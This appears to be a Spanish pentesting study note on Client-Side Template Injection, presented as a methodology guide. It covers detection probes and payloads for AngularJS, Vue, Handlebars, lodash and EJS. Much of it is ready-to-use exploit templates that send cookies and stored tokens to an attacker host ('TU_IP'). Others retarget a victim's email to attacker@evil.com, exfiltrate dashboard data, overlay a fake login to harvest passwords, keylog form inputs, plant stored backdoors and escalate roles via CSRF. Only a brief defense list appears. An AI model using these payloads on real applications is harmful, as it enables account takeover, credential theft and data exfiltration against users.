## 📚 Índice

- [[#🎯 1. ¿Qué es CSTI realmente?]]
- [[#🔍 2. Cómo detectar CSTI (método universal)]]
    - [[#2.1 Caso 1 → Sintaxis reflejada tal cual]]
    - [[#2.2 Caso 2 → Sintaxis interpretada (XSS inmediato)]]
    - [[#2.3 Caso 3 → Silent-fail, pero ejecuta lógica interna]]
- [[#🧠 3. Cómo funcionan las plantillas del lado del cliente (internamente)]]
- [[#⚡ 4. Motores de plantillas comunes vulnerables a CSTI]]
    - [[#4.1 AngularJS (< v1.6)]]
    - [[#4.2 Vue.js (bypasses)]]
    - [[#4.3 Handlebars / Mustache]]
    - [[#4.4 lodash.template]]
    - [[#4.5 EJS / Underscore]]
- [[#🚀 5. Explotación CSTI (metodología práctica PRO)]]
    - [[#5.1 Identificar el motor]]
    - [[#5.2 Encontrar dónde se evalúa la plantilla]]
    - [[#5.3 Confirmar ejecución]]
    - [[#5.4 Escalar a XSS]]
    - [[#5.5 Extraer información sensible del cliente]]
- [[#🔥 6. Payloads reales por motor]]
- [[#🧩 7. Modelos y plantillas de explotación listas para usar]]
    - [[#7.1 Template universal CSTI → XSS]]
    - [[#7.2 Template para pruebas silenciosas]]
    - [[#7.3 Template para exfiltración de sesión]]
    - [[#7.4 Template para enumeración de variables internas]]
- [[#🏆 8. Casos reales (HTB / Bug Bounty)]]
- [[#🛡️ 9. Cómo defender correctamente]]
-  [[#🌍 CSTI en aplicaciones reales (más allá del alert(1))]]
	- [[#🧨 ¿Qué buscas en una SPA cuando tienes CSTI?]]
    - [[#🎯 Patrón 1 — Robar sesión real (cookie, localStorage, sessionStorage)]]
    - [[#💳 Patrón 2 — Usar CSTI para llamar APIs internas de la SPA (acción real)]]
    - [[#📊 Patrón 3 — Dump de datos del dashboard (exportar info interna)]]
    - [[#🧪 Patrón 4 — Leer el estado interno de una SPA (React/Vue/Angular)]]
    - [[#🧲 Patrón 5 — Fake login phishing dentro de la misma app (MUY realista)]]
    - [[#⌨️ Patrón 6 — Keylogger local en un formulario crítico]]
    - [[#♻️ Patrón 7 — Backdoor persistente (cuando la plantilla se guarda en DB)]]
    - [[#🧱 Patrón 8 — Combinar CSTI + CSRF + API interna]]
- [[#🧠 Cómo vender esto en un reporte OSCP-style]]

---

# 🎯 1. ¿Qué es CSTI realmente?

**CSTI (Client-Side Template Injection)** ocurre cuando el usuario controla **parte o toda** una plantilla que un framework del lado del cliente evalúa como código.

El ataque se ejecuta **en el navegador de la víctima**, no en el servidor.

💡 En CSTI, tu payload se convierte en **código JavaScript real** ejecutado en el navegador.

---

# 🔍 2. Cómo detectar CSTI (método universal)

Aquí no se trata de leer `/etc/passwd`.  
Aquí se trata de saber: **¿mi payload se está interpretando como una plantilla JS?**

## 2.1 Caso 1 → Sintaxis reflejada tal cual

No siempre es vulnerable:

```
{{7*7}}
${alert(1)}
```

Si se imprimen sin ejecutar → probablemente **no** es CSTI.  
Pero quizá estás en una estructura que se interpreta más tarde.

## 2.2 Caso 2 → Sintaxis interpretada (XSS inmediato)

```
{{constructor.constructor('alert(1)')()}}
```

o en AngularJS:

```
{{7*7}}
```

→ **Si devuelve 49 → vulnerable.**

## 2.3 Caso 3 → Silent-fail, pero ejecuta lógica interna

Ejemplo Handlebars:

```
{{#with "constructor"}}{{this}}{{/with}}
```

→ No da error  
→ Pero te deja acceder a funciones internas

CSTI confirmado.

---

# 🧠 3. Cómo funcionan las plantillas del lado del cliente

Motores como AngularJS, Vue, Handlebars, Mustache, lodash.template:

1. Renderizan HTML dinámico
    
2. Interpretan expresiones como parte del DOM
    
3. Evaluan código interno
    
4. **En versiones inseguras → permiten ejecución arbitraria de JS**
    

CSTI = convertir una plantilla en **código ejecutable**.

---

# ⚡ 4. Motores de plantillas comunes vulnerables a CSTI

## 4.1 AngularJS (<1.6)

Super poderoso para exploitation:

```
{{constructor.constructor('alert(1)')()}}
```

o

```
{{$eval('alert(1)')}}
```

## 4.2 Vue.js (depende del contexto)

```
{{this.constructor.constructor('alert(1)')()}}
```

## 4.3 Handlebars

```
{{#with "constructor"}}{{#with "constructor"}}{{this}}{{/with}}{{/with}}
```

## 4.4 lodash.template

```
<%= global.process.mainModule.require('child_process').exec('calc.exe') %>
```

(Esto solo funciona **si evalúan plantillas en Node**, CSTI → SSTI híbrido).

## 4.5 EJS / Underscore

Pueden interpretar:

```
<%= alert(1) %>
```

---

# 🚀 5. Explotación CSTI (metodología práctica PRO)

## 5.1 Identificar el motor

Inserta:

```
{{7*7}}
{{constructor.constructor}}
${7*7}
<%= 7*7 %>
```

La respuesta del DOM o del error revela el motor.

## 5.2 Ubica **dónde** se evalúa la plantilla

- En el DOM directo
    
- En Vue `v-html`
    
- En Angular `ng-bind`
    
- En una librería JS como Handlebars.render()
    

## 5.3 Confirmar ejecución

Payloads no destructivos:

```
{{7*7}}
{{this}}
{{[].constructor}}
```

## 5.4 Escalar a XSS

Versión universal:

```
{{constructor.constructor('alert(1)')()}}
```

## 5.5 Extraer datos sensibles del cliente

Ejemplo: robo de cookies

```
document.location='http://tu_servidor/?c='+document.cookie
```

---

# 🔥 6. Payloads reales por motor

Organizados para pentesting:

|Motor|Payload confirmación|RCE/XSS|
|---|---|---|
|**AngularJS <1.6**|`{{7*7}}`|`{{constructor.constructor('alert(1)')()}}`|
|**Vue.js**|`{{this}}`|`{{this.constructor.constructor('alert(1)')()}}`|
|**Handlebars**|`{{#with 1}}test{{/with}}`|`{{#with "constructor"}}{{#with "constructor"}}{{this}}{{/with}}{{/with}}`|
|**EJS**|`<%= alert(1) %>`|`<%- alert(1) %>`|
|**lodash.template**|`<%= alert(1) %>`|`<%= (function(){alert(1)})() %>`|

---

# 🧩 7. Modelos y plantillas de explotación

## 7.1 Template universal CSTI → XSS

```
{{constructor.constructor('alert(1)')()}}
```

## 7.3 Template para exfiltrar cookies

```
{{constructor.constructor("fetch('http://TU_IP?c='+document.cookie)")()}}
```

## 7.4 Template para enumerar contexto interno

```
{{this}}
{{self}}
{{[].constructor}}
{{(() => this)()}}
```

---

# 🏆 8. Casos reales (HTB, CTF, Bug Bounty)

- **HTB – Mirai (AngularJS)**
    
- **CTF — múltiples retos Handlebars**
    
- **CVE-2019-7609 Kibana** → CSTI en AngularJS → RCE
    
- **Bug Bounty → Shopify themes** (Liquid bypass → CSTI → XSS)
    

---

# 🛡️ 9. Cómo defender

✔ Escapar SIEMPRE valores en plantillas  
✔ Nunca usar `v-html`, `ng-bind-html`  
✔ Deshabilitar sintaxis de ejecución en AngularJS  
✔ Handlebars: activar “strict mode”  
✔ CSP bien configurado  
✔ Sanitizadores (DOMPurify)  
✔ Revisar frameworks legacy (<1.5)

---

# 🌍 CSTI en aplicaciones reales (más allá del `alert(1)`)

La idea clave:

> CSTI = **tienes ejecución de JS en el contexto real del usuario**  
> → Puedes hacer **TODO** lo que el usuario puede hacer en esa sesión.

Nada de `/etc/passwd`.  
Aquí el juego es:

- Leer **tokens y secretos del navegador**
    
- Llamar **APIs internas** de la SPA
    
- Robar info del DOM (datos, tablas, dashboards)
    
- Automatizar **acciones** (cambiar correo, transferir, borrar, etc.)
    
- Montar **backdoors persistentes**

---
## 🧨 **¿Qué buscas en una SPA cuando tienes CSTI?**

La prioridad absoluta es:

# ⭐ **1. JWT / Access Tokens**

# ⭐ **2. Refresh Tokens**

# ⭐ **3. Cookies de sesión (si no son HttpOnly)**

Estas tres cosas = **ATAQUE PERFECTO**.

---

## 🎯 Patrón 1 — Robar sesión real (cookie, localStorage, sessionStorage)

### Objetivo

- Robar JWT, tokens, o cookies de sesión
    
- Enviar todo a tu servidor para reutilizar la sesión
    

### Template genérico (para motor tipo Angular / Handlebars / Vue, etc.)

```js
{{constructor.constructor(`
  const data = {
    cookie: document.cookie,
    ls: JSON.stringify(localStorage),
    ss: JSON.stringify(sessionStorage)
  };

  fetch('http://TU_IP:PUERTO/csti', {
    method: 'POST',
    mode: 'no-cors',
    body: JSON.stringify(data)
  });
`)()}}
```

🔑 Cosas importantes:

- `document.cookie` → a veces vacío si `HttpOnly`
    
- `localStorage` → muchas SPAs guardan `access_token`, `refresh_token`, `user_id`, etc.
    
- `sessionStorage` → a veces tokens temporales o datos de sesión
    

En un bug bounty real, esto:

- Lo pruebas primero hacia tu IP
    
- Luego usas ese `access_token` para llamar a `/api/me`, `/api/admin`, etc. desde Burp.
    

---

## 💳 Patrón 2 — Usar CSTI para **llamar APIs internas de la SPA** (acción real)

Caso típico:

- SPA en React/Vue/Angular
    
- Todo va por `/api/*` vía `fetch` o `XMLHttpRequest`
    
- El usuario tiene permisos de **admin / premium / internal**
    

Tú inyectas CSTI y haces que el navegador de la víctima llame a la API que QUIERES.

### Ejemplo: cambiar email de la cuenta a uno tuyo

```js
{{constructor.constructor(`
  fetch('/api/user/email', {
    method: 'PUT',
    headers: {
      'Content-Type': 'application/json',
      'X-CSRF-Token': document.querySelector('meta[name=csrf-token]')?.content || ''
    },
    body: JSON.stringify({ email: 'attacker@evil.com' })
  });
`)()}}
```

🤝 CSTI + CSRF interno:

- El navegador ya tiene **cookie de sesión** + CSRF en meta/DOM
    
- Tú solo llamas la API desde el contexto de la víctima
    

Puedes adaptarlo a:

- Cambiar password (si no pide la actual)
    
- Crear nuevos usuarios con rol admin
    
- Aprobar pagos / órdenes
    
- Borrar ítems
    
- Agregar claves API internas
    

---

## 📊 Patrón 3 — Dump de datos del dashboard (exportar info interna)

Escenario:

- Dashboard con una tabla de clientes / órdenes / tickets
    
- La app no tiene “exportar a CSV”
    
- Pero tú quieres sacar **todos los datos visibles** en la interfaz
    

### Template: scrape de tabla y exfiltración

```js
{{constructor.constructor(`
  const rows = Array.from(document.querySelectorAll('table tr'));
  const data = rows.map(tr => 
    Array.from(tr.querySelectorAll('th,td')).map(td => td.innerText.trim())
  );

  fetch('http://TU_IP:PUERTO/dump', {
    method: 'POST',
    mode: 'no-cors',
    body: JSON.stringify({ url: location.href, data })
  });
`)()}}
```

Resultados típicos:

- Nombres, emails, teléfonos, montos, status de pedidos
    
- Info interna que solo ven ciertos roles → **impacto alto** en reporte
    

---

## 🧪 Patrón 4 — Leer el estado interno de una SPA (React/Vue/Angular)

Muchas SPAs guardan cosas en:

- `window.__INITIAL_STATE__`
    
- `window.__NUXT__`
    
- `window.__APOLLO_STATE__`
    
- `window.store` / `window.__STORE__`
    

### Template para enumerar y exfiltrar estado global

```js
{{constructor.constructor(`
  const candidates = [
    '__INITIAL_STATE__',
    '__NUXT__',
    '__APOLLO_STATE__',
    'store',
    '__STORE__'
  ];

  const found = {};
  candidates.forEach(name => {
    if (window[name]) {
      try {
        found[name] = JSON.stringify(window[name]);
      } catch (e) {
        found[name] = String(window[name]);
      }
    }
  });

  if (Object.keys(found).length > 0) {
    fetch('http://TU_IP:PUERTO/state', {
      method: 'POST',
      mode: 'no-cors',
      body: JSON.stringify(found)
    });
  }
`)()}}
```

Esto te revela:

- User roles, feature flags, APIs internas
    
- IDs de recursos, tokens de GraphQL/REST
    
- Configuración secreta de la app
    

---

## 🧲 Patrón 5 — Fake login / phishing dentro de la misma app (MUY realista)

En vez de `alert(1)`, montas un modal que parece parte de la app:

### Template fake login en overlay

```js
{{constructor.constructor(`
  const modal = document.createElement('div');
  modal.style.position = 'fixed';
  modal.style.inset = '0';
  modal.style.background = 'rgba(0,0,0,0.6)';
  modal.style.zIndex = 999999;
  modal.innerHTML = \`
    <div style="background:#fff;max-width:420px;margin:10% auto;padding:20px;
                border-radius:8px;font-family:sans-serif;">
      <h2>Sesión expirada</h2>
      <p>Por seguridad, vuelve a iniciar sesión.</p>
      <form id="relogin">
        <label>Email</label><br>
        <input name="email" type="email" style="width:100%;margin-bottom:10px"><br>
        <label>Password</label><br>
        <input name="password" type="password" style="width:100%;margin-bottom:10px"><br>
        <button type="submit">Iniciar sesión</button>
      </form>
    </div>
    \`;

  document.body.appendChild(modal);

  modal.querySelector('#relogin').addEventListener('submit', function(e){
    e.preventDefault();
    const email = this.email.value;
    const password = this.password.value;

    fetch('http://TU_IP:PUERTO/creds', {
      method: 'POST',
      mode: 'no-cors',
      body: JSON.stringify({email,password, url: location.href})
    });

    modal.remove();
  });
`)()}}
```

⚠️ Esto es **muy potente** → para reporte, mejor mostrar POC con mensaje claro de “DEMO” y no guardar nada real en producción.

---

## ⌨️ Patrón 6 — Keylogger local en un formulario crítico

Por ejemplo, en una página “Actualizar datos bancarios”.

```js
{{constructor.constructor(`
  const inputs = document.querySelectorAll('input,textarea');
  inputs.forEach(inp => {
    inp.addEventListener('input', () => {
      fetch('http://TU_IP:PUERTO/keys', {
        method: 'POST',
        mode: 'no-cors',
        body: JSON.stringify({
          name: inp.name,
          value: inp.value,
          url: location.href
        })
      });
    });
  });
`)()}}
```


---

## ♻️ Patrón 7 — Backdoor persistente (cuando la plantilla se guarda en DB)

Escenario:

- Tienes CSTI en un campo que se renderiza con plantillas
    
- El valor se guarda en base de datos y se muestra a todos los usuarios
    
- Resultado = **CSTI almacenado (Stored CSTI) = Stored XSS masivo**
    

Ejemplo: campo “título de lista” en un tablero tipo Trello interno:

Valor que guardas:

```text
{{constructor.constructor('fetch("http://TU_IP/pwn?c="+document.cookie)')()}}
```

Cada vez que alguien abre el tablero → se dispara tu JS.

En un entorno real, podrías:

- Hookear todas las sesiones de admins
    
- Exfiltrar tokens internos
    
- Automatizar acciones de alto impacto
    

---

## 🧱 Patrón 8 — Combinar CSTI + CSRF + API interna

Caso típico “impacto crítico”:

1. CSTI → ejecutas JS en el navegador de un usuario logueado
    
2. Con ese JS:
    
    - Lees meta con CSRF token
        
    - Llamas a la API crítica con `fetch()`
        
3. Prácticamente es **CSRF imposible de mitigar sin resolver CSTI**
    

Template general:

```js
{{constructor.constructor(`
  const csrf = document.querySelector('meta[name=csrf-token]')?.content 
            || document.querySelector('input[name=csrf_token]')?.value 
            || '';

  fetch('/admin/users/123/role', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'X-CSRF-Token': csrf
    },
    body: JSON.stringify({ role: 'admin' })
  });
`)()}}
```

_Adaptas endpoint y payload a lo que veas en Burp._

---

## 🧠 Cómo vender esto en un reporte / OSCP-style

Cuando escribas tu reporte o nota en Obsidian, deja claro:

- **CSTI ≠ alert(1)**
    
- CSTI bien explotado permite:
    
    - **Account Takeover (ATO)** vía robo de tokens
        
    - **Data Exfiltration** de dashboards internos
        
    - **Acciones internas automáticas** (cambios de email, rol, password)
        
    - **Keylogging** de formularios sensibles
        
    - **Backdoors persistentes** en apps corporativas
        

---
